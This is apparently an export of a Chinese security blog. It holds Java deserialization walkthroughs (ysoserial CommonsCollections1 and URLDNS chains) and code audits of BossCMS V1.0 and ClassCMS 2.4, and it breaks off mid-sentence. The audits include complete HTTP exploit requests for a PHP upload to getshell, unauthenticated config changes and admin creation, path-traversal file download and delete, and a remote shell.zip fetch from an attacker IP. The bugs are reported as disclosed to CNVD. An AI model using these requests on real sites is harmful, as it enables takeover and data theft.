在动态代理套娃完成后，才将代码赋值给iTransformers常量，然后直接返回对象去序列化，就不会有非预期的命令执行了 隐藏日志特征 yso的transformers接口数组定义时，多在末尾创建了一个ConstantTransformer对象。 因为在命令执行时会返回异常信息，但是存在这个ConstantTransformer对象时的异常信息是不同的 少对象时 多对象时 所以判断可能是为了隐藏日志特征 版本限制 CC1在8u71后不能使用，我们对比下新老版本，分析一下原因 http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d 基于TransformedMap 第50-51行删除setValue的调用（这是一种黑名单的方式） 基于LazyMap 40-41行memberValues.entrySet()变为streamVals.entrySet() 21行streamVals 通过s.readField获得 15行删去了s.defaultReadObject 这里得到的streamVals和通过和s.defaultReadObject得到的对象有什么不同呢？ 其实和这个并没关系，只是改变后不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象 因为最后的poc是两个AnnotationInvocationHandler的套娃，外面的AnnotaationInvocationHandler（直接readObject的）它获得的streamVals确实还是一个代理对象，调用streamVals上面的方法确实会进入到invoke，最后也确确实实会调用到里层的AnnotationInvocationHandler.invoke()的this.memberValues.get()。 但是，后续对Map的操作都是基于这个新的LinkedHashMap对象，也就是里层的Ann...Handler的memberValues已经不是LazyMap了，而是LinkedHashMap了 漏洞原理 在回过头来看漏洞原理 这条链最终是利用org.apache.commons.collections.functors.InvokerTransformer 其中的 transform()方法中的反射机制来调用java.lang.Runtime的exec()进行命令执行 还有一个关键点在于Java 要能完成序列化与反序列化要求这个被序列化的类有继承Serializable，而Runtime类没有继承，所以直接使用就会报错。而Runtime.class是属于java.lang.Class，java.lang.Class实现了Serializable接⼝所以可以被序列化。而ChainedTransformer中的transform方法实现了Transformer接口的类数组的遍历，依次调用其中的transform方法传递给下一个元素，成为了关键的串连线，非常巧妙。 然后不管是基于TransformedMap还是LazyMap实现的Poc，都只是因为AnnotaationInvocationHandler方法重写了readObject，然后一步步走到了transform方法的执行 后记 作为一个刚开始学java安全的新人，网络上CC链的相关分析实在是很多。但大都不是很基础，会看的一头雾水，所以不如静下心来尝试自己先找一些Demo开始一点点的分析，遇到问题要先自己思考，等到思考过后再去寻求答案才是正确的选择。最后，小白入门，如果有错误希望师傅能够及时指出。 参考资料 P牛-Java安全漫谈 https://last-las.github.io/2020/11/05/yso-CommonsCollections/ https://www.cnblogs.com/9eek/p/15050035.html https://paper.seebug.org/1242/#commons-collections ","link":"https://liangyueliangyue.github.io/post/yso-zhi-cc1-lian/"},{"title":"yso之URLDNS链","content":"前言 文章首发于tools:yso之URLDNS链 Java反序列化 Java提供了一种对象序列化的机制，用一个字节序列表示一个对象，该字节包含对象的数据、对象的类型、对象的存储属性。字节序列写出到文件后，相当于可以持久保存一个对象，这过程叫做序列化。序列化对象会通过ObjectOutputStream的writeObject方法将一个对象写入到文件中。 而反序列化是使用了readObject 方法进行读取并还原成在序列化前的一个类。 这一步骤并没有什么安全问题，但是如果反序列化的数据是可控的情况下，那么我们就可以从某个输入点，输入恶意代码，再去查找在哪个点，我们的输入会被一层一层的带去到我们的触发点去，而这一步叫做寻找利用链的步骤。 ysoserial 因为java序列化后的数据为不可见字符，不方便构造，所以此项目帮你生成反序列化poc的脚本，但是并不会提供反序列化的点。 项目地址 https://github.com/angelwhu/ysoserial 使用 主要有两种使用方式，一种是运行ysoserial.jar 中的主类函数，另一种是运行ysoserial中的exploit 类，二者的效果是不一样的，一般用第二种方式开启交互服务 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar [payload] '[command]' java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://fq3jq6.dnslog.cn java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 2333 CommonsCollections1 'ping test.fq3jq6.dnslog.cn' 项目结构 │ GeneratePayload.java {{生成poc的入口函数}} │ Deserializer.java {{反序列化模块}} │ Serializer.java {{序列化模块}} │ Strings.java {{字符处理模块}} │ ├─exploit {{一些直接调用的exp}} │ JBoss.java │ JenkinsCLI.java │ JenkinsListener.java │ ...... │ ├─payloads {{生成gadget poc的代码}} │ │ CommonsBeanutils1.java │ │ URLDNS.java │ │ ..... │ │ │ ├─annotation {{一些不重要的配置}} │ │ Authors.java │ │ │ └─util {{一些重复使用的单元}} │ ClassFiles.java │ Gadgets.java │ └─secmgr {{和安全有关的管理}} DelegateSecurityManager.java ExecCheckingSecurityManager.java 动态调试 源码地址 https://github.com/frohoff/ysoserial 克隆到本地直接用idea打开，这时候IDEA会自动根据其中的配置下载依赖，只需要等待几分钟 自动下载后最好在pom.xml那把剩下的依赖也解决了 程序入口 首先找到程序的入口点，点开pom.xml搜索mainclass就可以找到入口点的类 ctrl+左键点击跟踪进去，运行测试一下。 需要参数 主函数调用链 1处接受2个参数比如 URLDNS 'http://www.baidu.com' 2处获得poc模块的类，这里就是URLDNS.java类 3处实例化poc类以及将第二个参数传入类 4处序列化一次然后输出（poc） 在run-edit config中配置参数 这里填入URLDNS链的启动参数 URLDNS http://fq3jq6.dnslog.cn 再次运行这样我们就获取到了一个序列化的数据。 手动构造pop链 指定类的hashmap到指定类的hashcode tips:HashSet列表的add也会调用map.put只是链子更长而已 HashMap&lt;String, String&gt; map = new HashMap&lt;String, String&gt;(); // 键不能重复，值可以重复 map.put(&quot;san&quot;, &quot;张三&quot;); map.put(&quot;si&quot;, &quot;李四&quot;); map.put(&quot;wu&quot;, &quot;王五&quot;); map.put(&quot;wang&quot;, &quot;老王&quot;); map.put(&quot;wang&quot;, &quot;老王2&quot;);// 老王被覆盖 map.put(&quot;lao&quot;, &quot;老王&quot;); System.out.println(&quot;-------直接输出hashmap:-------&quot;); System.out.println(map); 我们跟进put函数 public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } 跟进从putVal到hash函数 static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); } 发现和hashCode相关。也就意味着当我们使用hashmap的put的时候，key会调用-&gt;hash(key)-&gt;然后调用key.hashCode() 也就是说只要key是一个对象，那么我们可以调用任意对象的hanshCode函数 那么又是怎么通过hashCode来发起dns请求的？ URL类中的hashcode URL.java 881，URL对象hashCode函数调用了handler.hashCode public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } 跟进handler.hashCode()（URLStreamHandler.java 350）,他是由URLStreamHandler类形成的对象，是一个抽象类 用来处理协议（http/https）的建立连接 hashCode调用了getHostAddress函数 protected int hashCode(URL u) { int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); ........... 跟进getHostAddress(u)（URLStreamHandler.java 433），看名字也知道是用来获取主机IP地址的 在其中调用了InetAddress.getByName protected synchronized InetAddress getHostAddress(URL u) { if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.equals(&quot;&quot;)) { return null; } else { try { u.hostAddress = InetAddress.getByName(host); ......................................... 而InetAddress.getByName(host)就是DNS请求了 那么就清楚了,调用链map.put(Url,XX)-&gt;URL.hashCode-&gt;handler.hashCode-&gt;getHostAddress(u)-&gt;u.hostAddress=InetAddress.getByName(host); 发出DNS请求，那么我们就可以简单构造一下 HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); URL test_url= null; try { test_url = new URL(&quot;http://test.kei8v0.dnslog.cn&quot;); hashMap.put(test_url, &quot;22222&quot;); System.out.println(&quot;success&quot;); } catch (MalformedURLException e) { e.printStackTrace(); } 到这里成功执行了DNS请求 hashmap的反序列化 我们前往HashMap.java private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { ......................... // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) { @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); #！！！！！！！！！！！ } } } 发现readObject每个值也会调用putVal-&gt;hash(作用和HashMap中的put函数一致)，然后如果key为URL类型就会掉入前面URLDNS的链中，那么我们现在非常方便写代码 public static void main(String[] args) throws Exception{ //构造请求链 HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;(); URL url = new URL(&quot;http://lyyy.dr8m3e.dnslog.cn\\n\\n&quot;); Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); f.setAccessible(true); f.set(url, 0); hashMap.put(url, &quot;test&quot;); f.set(url, -1); //序列化操作 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;)); oos.writeObject(hashMap); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); ois.readObject(); } 这里前面进行构造，后面进行序列化以及反序列化触发 有一个有意思的点是为了不让构造的时候触发dns请求影响结果判断，我们先使URL类中的hashCode值为0 我们分析URL的hashCode public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } 发现hashCode为-1的时候才调用handler.hashCode() 而hashCode定义为private int hashCode = -1; 默认为-1，我们要在构造的时候不发起dns请求，所以我们要在put之前set为非-1的值 注意在put结束后要恢复到-1，否则反序列化的时候也不会请求。 最后的利用链简化 HashMap-&gt;readObject() HashMap-&gt;putVal() HashMap-&gt;hash() URL-&gt;hashCode() URLStreamHandler-&gt;hashCode() URLStreamHandler-&gt;getHostAddress() InetAddress-&gt;getByName() URLDNS链分析 URLDNS是ysoserial里面就简单的一条利用链，但URLDNS的利用效果是只能触发一次dns请求，而不能去执行命令。比较适用于漏洞验证这一块，而且URLDNS这条利用链并不依赖于第三方的类，而是JDK中内置的一些类和方法。 在一些漏洞利用没有回显的时候，我们也可以使用到该链来验证漏洞是否存在。 调用jar包得到序列化后的数据，如果需要执行，需要对其做反序列化操作。这里先开始看看数据是怎么获取的 打开src/main/java/ysoserial/payloads/URLDNS.java的源码 在注释中标明了调用链 * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() 和手动构造的前半部分一致 在put地方打一个断点,再找到hashMap.readObject中的putVal打上断点 开始调试直接跳到第二个点 putVal调用了hash，key是自己指定的url：http://fq3jq6.dnslog.cn 通过readObject函数生成的URL对象 步入hash函数，这里key传入URL对象 所以调用了URL类的hashCode，继续步入hashCode hashCode=-1时去执行hadler.hashCode 执行getHostAddress，u为http://fq3jq6.dnslog.cn 调用了InetAddress.getByName,成功发起dns请求，调用链和手动构造一模一样 本地使用yso测试 本地进行反序列化测试一下，手动生成 tips:这里不能用powershell运行，会在文件头加上错误信息导致报错 java -jar ysoserial.jar URLDNS http://8q2frx.dnslog.cn &gt; out.bin 本地反序列化Demo import java.io.FileInputStream; import java.io.ObjectInputStream; public class Helloworld{ public static void main(String[] args) throws Exception { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); ois.readObject(); } } 探究冗余处理 那么yso是怎么处理构造时发出的dns请求呢？ 查看URLDNS源码可以发现，作者构造URL对象时使用了三个参数 来到析构函数查看，是可以通过指定处理程序解析来订制规范创建URL 也就是依赖handler来制定规范创建URL对象 handler是上面创建的 跟进 static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } 直接重写了getHostAddress()内容为返回空 那么如果我们传入的handler为自己改写的时，创建URL对象调用hashCode函数就不能发起DNS请求了 那么为什么在反序列化的时候会有请求呢？ 因为之前说过序列化只记录类的属性，而函数内容不管，所以这个对象的函数被重写并不影响序列化的结果。 而反序列在被攻击端进行，只要序列化数据正常，自然可以正常发起DNS请求 总结 URLDNS链 hashmap重写了readobject反序列化方法，而重写后的readobject方法调用了一系列方法最后发起dns请求 使用的全部是JDK中内置的类和方法，不会有环境要求，所以利用范围大 使用的全部是JDK中内置的类和方法，学习后对java源码理解更深入 原生类的很多方法都会最后发起DNS请求，但是这里是对反序列化的探测，所以需要的是 1.重写readObject函数 2.重写后的readObject执行了危险操作（危险类/危险函数） 参考 java代码审计入门3-ysoserial调试和构造URLDNS的pop链 Java安全之URLDNS链 ","link":"https://liangyueliangyue.github.io/post/yso-zhi-urldns-lian/"},{"title":"BossCMSV1.0代码审计","content":"BossCMSV1.0代码审计 前言 文章先发于先知社区BossCMSV1.0代码审计 以下漏洞均已提交CNVD并被收录 后台任意文件上传 在后台安全设置处添加允许上传类型.php 然后通过ueditor的附件上传即可上传php木马文件getshell 确定位置 先随意找到上传点，然后抓包上传 修改后缀名发送后得到报错信息 {&quot;state&quot;:&quot;该文件扩展名不允许上传！&quot;} 审计源码 通过报错信息定位到源码在/system/basic/class/upload.class.php下 else为结果，那么在if处打上断点 上传php文件开始调试 发现两个条件都不满足 php后缀名不在$extension中 !type!=true也就是type!=true也就是type!=true也就是type不为null 第一个条件 首先解决第一个问题，在文件29行处可以看到$extension变量值的获取 那么全局搜索upload_extension，发现他在/system/admin/theme/default/safe.php中获取 根据路由规则访问 http://bosscms/admin/#safe 存在允许上传类型，那么直接添加.php然后保存，回到源码继续上传.php调试 可以看出这时候$extension数组中多了一个值即.php，成功满足第一个要求 第二个条件 要让!type!=true，也就是让type!=true，也就是让type!=true，也就是让type=null即可，也就是执行到函数的35行 这里需要满足$ext（.php） 在 arr数组中，那么继续看arr 数组中，那么继续看arr数组中，那么继续看arr数组是从 $G['extension'][$t]中获取的 这里的$t值是photo，获取到的arr为 &quot;.jpg&quot;, &quot;.gif&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.tif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;, &quot;.webp&quot; 全局搜索得到system/basic/json/extension.json 在code键值中看到了我们想要上传的.php 所以的我们的$t应该为code，再回到upload.class.php t是遍历t是遍历t是遍历arrary获得的，而array是分割array是分割array是分割type获得的，可以看到files函数调用时$type默认值是null，那么就是调用时指定code值 跟踪函数，定位到/system/extend/ueditor/php/ueditor.class.php中第246行，调用files函数并且指定了code值 成功解决了第二个条件 测试上传 很明显漏洞存在于ueditor编辑器的附件上传处 选择PHP木马文件 上传成功 点击确认后右键打开新链接获得路径 成功getshell 后台任意文件下载 后台构造url可以进行任意文件下载 http://bosscms/admin/?mold=safe&amp;part=backup&amp;func=download&amp;id=../../../index.php 确定位置 定位到/system/admin/safe/backup.class.php 可以看到没有任何过滤，直接通过传值然后下载文件，get传参id值为文件名且可以穿越 审计源码 全局搜索call_user_func，最后在/system/basic/class/into.class.php的load_class函数中找到可以利用的方法load_class 然后就是找调用链 在/admin/index.php开始 再到/system/enter.php /system/basic/class/into.class.php 在执行load_class函数，存在func值成功调用download方法 mold和mold和mold和part用来拼接文件然后包含一次，然后new 一个part对象然后检查是对象中是否存在part对象然后检查是对象中是否存在part对象然后检查是对象中是否存在func函数，存在即调用 所以可以构造url http://bosscms/admin/?mold=safe&amp;part=backup&amp;func=download&amp;id=../../../index.php 在load_class方法打上断点然后访问 成功调用download，参数获取正确 下载文件成功 且此CMS的数据库信息写在固定文件/system/basic/ini/mysql.ini.php 可以配合进行敏感信息泄露 后台任意文件删除 确定位置 定位到/system/admin/safe/backup.class.php 还是没有任何过滤，get传参id值为文件名然后调用delete进行删除 使用之前的利用链，先在站点根目录新建test.txt 然后根据规则（post：url，get：id）构造请求包 /system/admin/safe/backup.class.php文件中的delete方法 POST /admin/?mold=safe&amp;part=backup&amp;func=delete&amp;id=../../../test.txt HTTP/1.1 Host: bosscms Content-Length: 135 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://bosscms Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYe2EcUgaamtd4Xnh User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://bosscms/admin/?mold=safe&amp;part=backup&amp;func=table Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundaryYe2EcUgaamtd4Xnh Content-Disposition: form-data; name=&quot;url&quot; 1 ------WebKitFormBoundaryYe2EcUgaamtd4Xnh-- 成功删除文件 未授权 未授权任意文件下载和删除 对用户是否登录的验证在system/basic/class/admin.class.php文件init函数中 当判断未登录时通过header进行页面跳转，但是没有exit()或者die()终止程序运行 所以还是能够得到自己的结果后才跳转（这一点可以在BP中体现） 在未登录状态下 先执行删除，成功执行得到结果 然后才会重定向到登录页面 任意文件下载也是同理，在BP中即可看到跳转前结果 未授权任意文件上传 通过未授权将之前后台任意文件上传攻击面扩大 文件上传未授权 POST /system/extend/ueditor/php/controller.php?action=uploadfile HTTP/1.1 Host: bosscms Content-Length: 200 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://bosscms Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvwjLJGiYAdfklq31 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundaryvwjLJGiYAdfklq31 Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;test.php&quot; Content-Type: image/png &lt;?php phpinfo();?&gt; ------WebKitFormBoundaryvwjLJGiYAdfklq31-- 修改上传配置点未授权 找到可利用的函数/system/admin/safe/safe.class.php文件中的add函数，参数可控 还是之间的链，根据代码构造请求，在post请求中upload_extension数组里添加.php键值 POST /admin/?mold=safe&amp;part=safe&amp;func=add HTTP/1.1 Host: bosscms Content-Length: 987 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://bosscms Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLNKwhkxPkcJiHO5I User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://bosscms/admin/?mold=safe&amp;part=safe&amp;func=init&amp;lang=1 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundaryLNKwhkxPkcJiHO5I Content-Disposition: form-data; name=&quot;admin_folder&quot; admin ------WebKitFormBoundaryLNKwhkxPkcJiHO5I Content-Disposition: form-data; name=&quot;admin_login_captcha&quot; 1 ------WebKitFormBoundaryLNKwhkxPkcJiHO5I Content-Disposition: form-data; name=&quot;admin_logout_time&quot; 28888 ------WebKitFormBoundaryLNKwhkxPkcJiHO5I Content-Disposition: form-data; name=&quot;page_cache_time&quot; 0 ------WebKitFormBoundaryLNKwhkxPkcJiHO5I Content-Disposition: form-data; name=&quot;upload_rename&quot; 1 ------WebKitFormBoundaryLNKwhkxPkcJiHO5I Content-Disposition: form-data; name=&quot;upload_maxsize&quot; 2 ------WebKitFormBoundaryLNKwhkxPkcJiHO5I Content-Disposition: form-data; name=&quot;upload_extension&quot; [&quot;.jpg&quot;,&quot;.png&quot;,&quot;.jpeg&quot;,&quot;.gif&quot;,&quot;.mp4&quot;,&quot;.mp3&quot;,&quot;.pdf&quot;,&quot;.doc&quot;,&quot;.xls&quot;,&quot;.xlsx&quot;,&quot;.bmp&quot;,&quot;.csv&quot;,&quot;.ico&quot;,&quot;.JPG&quot;,&quot;.php&quot;] ------WebKitFormBoundaryLNKwhkxPkcJiHO5I Content-Disposition: form-data; name=&quot;ueditor_catchimage&quot; 0 ------WebKitFormBoundaryLNKwhkxPkcJiHO5I-- 成功未授权修改配置 修改配置之后可以未授权任意文件上传了 成功访问执行 未授权用户操作 用户操作相对于来说也算敏感操作，就顺带写了 确定位置 定位到/system/admin/manager/manager.class.php 其中的add,edit,delete三个函数参数都是由请求获得的（可控的） 根据规则构造请求包，以下为关键点 mold=manager&amp;part=manager&amp;func=add /system/admin/manager/manager.class.php中的add函数 POST传参 username-用户名 password-密码 password-确认密码 level-权限 （2为系统管理员） 请求包 POST /admin/?mold=manager&amp;part=manager&amp;func=add HTTP/1.1 Host: bosscms Content-Length: 1959 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://bosscms Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB067fgIWBKtHI4Gy User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://bosscms/admin/?mold=manager&amp;part=manager&amp;func=edit Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;username&quot; 123 ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;password&quot; 123 ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;passwords&quot; 123 ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;level&quot; 2 ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;department&quot; ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;open&quot; 1 ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;permit1&quot; ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;permit2&quot; [&quot;content&amp;content&quot;,&quot;items&amp;items&quot;,&quot;banner&amp;banner&quot;,&quot;consult&amp;consult&quot;,&quot;feedback&amp;feedback&quot;,&quot;search&amp;search&quot;,&quot;seo&amp;seo&quot;,&quot;seo&amp;violation&quot;,&quot;seo&amp;rewrite&quot;,&quot;anchor&amp;anchor&quot;,&quot;link&amp;link&quot;,&quot;plugin&amp;plugin&quot;,&quot;plugin&amp;market&quot;,&quot;template&amp;template&quot;,&quot;template&amp;market&quot;,&quot;store&amp;store&quot;,&quot;manager&amp;manager&quot;,&quot;safe&amp;safe&quot;,&quot;safe&amp;backup&quot;,&quot;site&amp;site&quot;,&quot;site&amp;email&quot;,&quot;site&amp;sms&quot;,&quot;site&amp;code&quot;,&quot;menu&amp;menu&quot;,&quot;language&amp;language&quot;,&quot;site&amp;state&quot;] ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;permit3&quot; [&quot;content&amp;content&quot;,&quot;items&amp;items&quot;,&quot;banner&amp;banner&quot;,&quot;consult&amp;consult&quot;,&quot;feedback&amp;feedback&quot;,&quot;search&amp;search&quot;,&quot;plugin&amp;plugin&quot;,&quot;safe&amp;backup&quot;,&quot;site&amp;site&quot;,&quot;site&amp;code&quot;,&quot;menu&amp;menu&quot;,&quot;language&amp;language&quot;,&quot;site&amp;state&quot;] ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;permit4&quot; ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;image&quot; ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;alias&quot; ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;email&quot; ------WebKitFormBoundaryB067fgIWBKtHI4Gy Content-Disposition: form-data; name=&quot;phone&quot; ------WebKitFormBoundaryB067fgIWBKtHI4Gy-- 成功添加管理员用户 成功登录，且为管理员权限 后记 都是一些简单常见的漏洞点，主要还是一个跳转之后未及时结束程序导致访问控制体系崩塌，后台变前台 ","link":"https://liangyueliangyue.github.io/post/bosscmsv10-dai-ma-shen-ji/"},{"title":"ClassCMS2.4代码审计","content":"ClassCMS2.4代码审计 前言 首发于先知社区：ClassCMS2.4代码审计 此次漏洞分析皆在本地测试，且漏洞已经提交至cnvd平台 漏洞url 需要后台管理员权限 http:///ClassCMS/admin666?do=shop:downloadClass&amp;ajax=1 漏洞点 在后台的 管理-&gt;应用管理-&gt;应用下载处存在任意远程文件下载 先放掉第一个请求包 POST /admin666?do=shop:index&amp;ajax=1&amp;action=fileurl&amp;from=install HTTP/1.1 Host: classcms Content-Length: 43 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://classcms Referer: http://classcms/admin666?do=shop:index&amp;bread=%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%A8%E5%8D%95&amp;action=detail&amp;classhash=diyform Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: token_2ab421=9632c6413dde844887912fd77a75a07f; csrf_2ab421=1547308b Connection: close classhash=diyform&amp;version=1.1&amp;csrf=1547308b 然后修改第二个请求包 POST /admin666?do=shop:downloadClass&amp;ajax=1 HTTP/1.1 Host: classcms Content-Length: 85 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://192.168.159.1 Referer: http://192.168.159.1/ClassCMS/admin666?do=shop:index&amp;bread=%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91&amp;action=detail&amp;classhash=classcreate Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: token_2ab421=5d012ca838cc5f0aff02c44c8e2c91e7; csrf_2ab421=338ceb00 Connection: close classhash={dir}&amp;url=http://@{ip}:{port}@classcms.com/{shell.zip}&amp;csrf=338ceb00 参数解析 classhash为解压出来的最后文件名 url为了绕过过滤设成如下形式 http://@192.168.159.1:80@classcms.com/shell.zip 远程ip端口（默认80也需要加上），一个包含木马文件（shell.php）的zip压缩包 csrf参数不动即可 发送之后返回:安装包格式错误，请重试 就说明已经成功被下载到目标服务器上并解压 最后访问url即可执行上传上的木马getshell http://192.168.159.1/ClassCMS/class/{classhash的值}/{上传压缩包中的木马文件} 漏洞测试 首先黑盒测试 在下载的第二个请求包中发现url参数解码为classcms官网的应用压缩包地址 POST /admin666?do=shop:downloadClass&amp;ajax=1 HTTP/1.1 Host: classcms Content-Length: 140 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://classcms Referer: http://classcms/admin666?do=shop:index&amp;bread=%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%A8%E5%8D%95&amp;action=detail&amp;classhash=diyform Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: token_2ab421=9632c6413dde844887912fd77a75a07f; csrf_2ab421=1547308b Connection: close classhash=diyform&amp;url=http%3A%2F%2Fclasscms.com%2Fshop%2F%3Faction%3Ddownload%26version%3D1.1%26classhash%3Ddiyform%26token%3D&amp;csrf=1547308b 可能存在远程下载 http://classcms.com/shop/?action=download&amp;version=1.1&amp;classhash=diyform&amp;token= 尝试修改url，得到报错回显 Unicode解码得到 ：下载失败 进行白盒测试 回到源码来，通过全局搜索报错提示（下载失败）定位到源码在/class/shop/shop.php中 一处为在downloadClass函数中一处在upgradeClass函数中，观察功能显然是在downloadClass中 function downloadClass() { 。。。。。。 if(!C('this:download',$url,$classfile)) { Return C('cms:common:echoJson',array('msg'=&gt;&quot;下载失败&quot;,'error'=&gt;1)); } 。。。。。。 } 在this(当前文件shop.php)-&gt;download函数下,定位到关键函数 function download($url,$filepath) { $hosts=array_merge(explode(';',C('this:defaultHost')),array(config('host'))); if($defaulthost=config('defaulthost')) { $hosts=array_merge($hosts,explode(';',$defaulthosts)); } $checkurl=parse_url($url); if(!isset($checkurl['host']) || !in_array($checkurl['host'],$hosts)) { Return false; } $curl=curl_init(); curl_setopt($curl,CURLOPT_URL,$url); if(!$fp = @fopen ($filepath,'w+')) { Return false; } curl_setopt($curl,CURLOPT_FILE, $fp); curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,10); curl_setopt($curl,CURLOPT_TIMEOUT,300); curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,FALSE); curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,FALSE); curl_setopt($curl,CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0); curl_setopt($curl,CURLOPT_POST,1); curl_setopt($curl,CURLOPT_POSTFIELDS,C('this:shopInfo')); $info=curl_exec($curl); $httpinfo=curl_getinfo($curl); curl_close($curl); fclose($fp); if($httpinfo['http_code']&gt;=300) {@unlink($filepath);Return false;} Return $info; } 函数首先获取了默认允许的host，在this(前文件下)-&gt;defaultHost函数中 只允许 classcms.com;classcms.uuu.la 这里可以抓包调试一下，可以看到确实是获取了这两个根域（虽然数组是三个） 然后将我们传入的url (这里是http://192.168.159.1/1.txt) 